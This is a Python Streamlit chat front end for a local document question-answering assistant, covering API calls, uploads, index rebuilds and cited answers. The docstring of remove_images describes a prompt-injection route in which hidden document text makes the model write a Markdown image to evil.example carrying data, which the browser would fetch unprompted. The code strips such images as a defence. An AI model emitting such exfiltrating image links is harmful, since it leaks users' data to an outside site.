"""Streamlit chat UI. Talks ONLY to the FastAPI backend over HTTP — never imports app.*.

Run:  streamlit run ui/streamlit_app.py   (the API must be running on API_URL)
"""

import os
import re
from dataclasses import dataclass
from typing import Any

import httpx
import streamlit as st

API_URL = os.environ.get("API_URL", "http://localhost:8000").rstrip("/")
DEFAULT_TIMEOUT_S = 10.0
ASK_TIMEOUT_S = 180.0  # longer than the API's own LLM timeout (LLM_TIMEOUT_S=120)
REBUILD_TIMEOUT_S = 300.0
START_API_COMMAND = "uvicorn app.api.main:app --reload"
# Markdown image: ![alt](url). The browser would load the url automatically.
MARKDOWN_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")


# ---------- HTTP helpers (no Streamlit here, so tests can call them directly) ----------

@dataclass
class ApiResult:
    ok: bool
    status: int | None  # None means we never got an answer from the API
    data: Any = None
    error: str = ""


def error_message(response: httpx.Response) -> str:
    """Turn the API's error body into one readable sentence."""
    try:
        detail = response.json().get("detail")
    except (ValueError, AttributeError):
        return f"HTTP {response.status_code}"

    if isinstance(detail, list):
        # 422 from Pydantic: a list like [{"loc": ["body", "question"], "msg": "..."}]
        parts = []
        for item in detail:
            field = ".".join(str(part) for part in item.get("loc", [])[1:]) or "request"
            parts.append(f"{field}: {item.get('msg', 'invalid')}")
        return "; ".join(parts)
    return str(detail) if detail else f"HTTP {response.status_code}"


def call_api(
    method: str, path: str, timeout: float = DEFAULT_TIMEOUT_S, client: httpx.Client | None = None, **kwargs
) -> ApiResult:
    """Send one request. Never raises: every failure becomes an ApiResult with ok=False."""
    http = client or httpx.Client(base_url=API_URL)
    try:
        response = http.request(method, path, timeout=timeout, **kwargs)
    except httpx.TimeoutException:
        return ApiResult(False, None, error=f"The API at {API_URL} did not answer within {timeout:.0f} s.")
    except httpx.HTTPError:
        return ApiResult(False, None, error=f"Cannot reach the API at {API_URL}. Start it with: {START_API_COMMAND}")
    finally:
        if client is None:
            http.close()

    if response.is_success:
        return ApiResult(True, response.status_code, response.json())
    return ApiResult(False, response.status_code, error=error_message(response))


def get_health(client: httpx.Client | None = None) -> ApiResult:
    return call_api("GET", "/health", client=client)


def get_documents(client: httpx.Client | None = None) -> ApiResult:
    return call_api("GET", "/documents", client=client)


def ask(question: str, client: httpx.Client | None = None) -> ApiResult:
    return call_api("POST", "/ask", timeout=ASK_TIMEOUT_S, client=client, json={"question": question})


def upload(filename: str, content: bytes, mime_type: str | None, client: httpx.Client | None = None) -> ApiResult:
    files = {"file": (filename, content, mime_type or "application/octet-stream")}
    return call_api("POST", "/documents", client=client, files=files)


def rebuild(client: httpx.Client | None = None) -> ApiResult:
    return call_api("POST", "/index/rebuild", timeout=REBUILD_TIMEOUT_S, client=client)


def remove_images(text: str) -> str:
    """Drop Markdown images from LLM output.

    A document could contain hidden instructions that make the model write
    ![x](http://evil.example/?data=...). Rendering it would make the browser
    send a request to that site without any click. Links are kept: they need a click.
    """
    return MARKDOWN_IMAGE.sub("[image removed]", text)


def format_details(answer: dict) -> str:
    """Small caption under an answer: model, prompt version, timings."""
    t = answer.get("timings_ms", {})
    return (
        f"{answer.get('model', '?')} · prompt {answer.get('prompt_version', '?')} · "
        f"retrieve {t.get('retrieve', 0):.0f} ms · generate {t.get('generate', 0):.0f} ms · "
        f"total {t.get('total', 0):.0f} ms"
    )


# ---------- Streamlit UI ----------

def show_notice() -> None:
    """Show a message saved before st.rerun() (e.g. 'Upload saved'), then forget it."""
    notice = st.session_state.pop("notice", None)
    if notice:
        kind, text = notice
        getattr(st.sidebar, kind)(text)


def render_sidebar() -> bool:
    """Draw the sidebar. Returns False if the API is down."""
    st.sidebar.header("Status")
    health = get_health()
    if not health.ok:
        st.sidebar.error("API offline")
        return False

    h = health.data
    if h["status"] == "ok":
        st.sidebar.success("API, index and LLM ready")
    st.sidebar.markdown(f"**Model:** `{h['model']}`  \n**Chunks in index:** {h['chunks']}")
    if not h["llm_reachable"]:
        st.sidebar.warning("Ollama is not reachable. Start it with `ollama serve`. Questions will fail until then.")
    if not h["index_loaded"]:
        st.sidebar.warning("No index yet. Upload documents, then rebuild the index.")

    show_notice()

    st.sidebar.header("Documents")
    documents = get_documents()
    if documents.ok and documents.data:
        for doc in documents.data:
            unit = "chunk" if doc["chunks"] == 1 else "chunks"
            st.sidebar.markdown(f"- `{doc['source']}` — {doc['chunks']} {unit}")
    elif documents.ok:
        st.sidebar.caption("No documents indexed yet.")

    uploaded = st.sidebar.file_uploader("Add a document", type=["pdf", "md", "txt"])
    if uploaded is not None and st.sidebar.button("Upload"):
        result = upload(uploaded.name, uploaded.getvalue(), uploaded.type)
        if result.ok:
            st.session_state.notice = ("success", f"Saved `{result.data['filename']}`. Rebuild the index to search it.")
        else:
            st.session_state.notice = ("warning", f"Upload refused: {result.error}")
        st.rerun()

    if st.sidebar.button("Rebuild index"):
        with st.sidebar, st.spinner("Rebuilding the index…"):
            result = rebuild()
        if result.ok:
            d = result.data
            st.session_state.notice = (
                "success",
                f"Index rebuilt: {d['documents']} documents, {d['chunks']} chunks in {d['seconds']} s.",
            )
        else:
            st.session_state.notice = ("warning", f"Rebuild failed: {result.error}")
        st.rerun()

    return True


def render_answer(message: dict) -> None:
    """Draw one assistant message: an error, an abstention, or an answer with sources."""
    if message.get("error"):
        status = message.get("status")
        if status == 503:
            st.error(f"The assistant is unavailable: {message['error']}")
        elif status == 502:
            st.error(f"The language model returned an error: {message['error']}")
        elif status == 422:
            st.warning(f"Please change your question: {message['error']}")
        else:
            st.error(message["error"])
        return

    answer = message["answer"]
    if answer["abstained"]:
        # Not an error: the app is doing its job by refusing to guess.
        st.info(answer["answer"])
        if answer["timings_ms"].get("generate", 0) == 0:
            st.caption("No source was close enough to the question, so nothing was sent to the LLM.")
    else:
        st.markdown(remove_images(answer["answer"]))

    if answer["invalid_citations"]:
        st.warning("These citations do not match any retrieved source: " + ", ".join(answer["invalid_citations"]))

    for source in answer["sources"]:
        with st.expander(f"{source['citation']} — score {source['score']:.3f}"):
            st.text(source["snippet"])
    st.caption(format_details(answer))


def render_chat() -> None:
    if "messages" not in st.session_state:
        st.session_state.messages = []

    for message in st.session_state.messages:
        with st.chat_message(message["role"]):
            if message["role"] == "user":
                st.markdown(message["text"])
            else:
                render_answer(message)

    question = st.chat_input("Ask a question about your documents")
    if not question:
        return

    st.session_state.messages.append({"role": "user", "text": question})
    with st.chat_message("user"):
        st.markdown(question)

    with st.chat_message("assistant"):
        with st.spinner("Searching your documents and asking the local LLM…"):
            result = ask(question)
        if result.ok:
            message = {"role": "assistant", "answer": result.data}
        else:
            message = {"role": "assistant", "error": result.error, "status": result.status}
        render_answer(message)
    st.session_state.messages.append(message)


def main() -> None:
    st.set_page_config(page_title="AI Knowledge Assistant", page_icon="📚")
    st.title("📚 AI Knowledge Assistant")
    st.caption("Answers only from your documents, with citations. Everything runs on this computer.")

    if not render_sidebar():
        st.error(f"Cannot reach the API at {API_URL}. Start it in another terminal:")
        st.code(START_API_COMMAND, language="bash")
        st.stop()

    render_chat()


if __name__ == "__main__":
    main()
